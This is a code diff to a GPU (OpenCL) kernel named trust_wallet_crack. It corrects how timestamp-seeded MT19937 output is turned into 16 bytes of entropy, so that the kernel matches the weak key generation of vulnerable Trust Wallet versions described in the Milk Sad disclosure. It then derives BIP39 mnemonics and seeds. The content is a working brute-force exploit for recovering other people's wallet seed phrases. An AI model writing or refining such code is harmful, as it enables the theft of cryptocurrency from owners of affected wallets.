@@ -15,15 +15,16 @@ __kernel void trust_wallet_crack(
     
     
     // Generate 128-bit entropy using MT19937
-    uint entropy_words[4];
-    mt19937_extract_128(timestamp, entropy_words);
+    // CRITICAL: Trust Wallet uses LSB (Least Significant Byte) extraction!
+    // Each MT19937 word contributes its lower 8 bits only
+    // See: https://milksad.info/disclosure.html
+    uint entropy_words[16]; // Need 16 words for 16 bytes (LSB extraction)
+    mt19937_extract_128_lsb(timestamp, entropy_words);
     
     uchar entropy[16] __attribute__((aligned(4)));
-    for (int i = 0; i < 4; i++) {
-        entropy[i*4 + 0] = (entropy_words[i] >> 24) & 0xFF;
-        entropy[i*4 + 1] = (entropy_words[i] >> 16) & 0xFF;
-        entropy[i*4 + 2] = (entropy_words[i] >> 8) & 0xFF;
-        entropy[i*4 + 3] = entropy_words[i] & 0xFF;
+    for (int i = 0; i < 16; i++) {
+        // Take least significant 8 bits from each word
+        entropy[i] = entropy_words[i] & 0xFF;
     }
     
     // BIP39: Entropy → Mnemonic → Seed (PROPER IMPLEMENTATION)
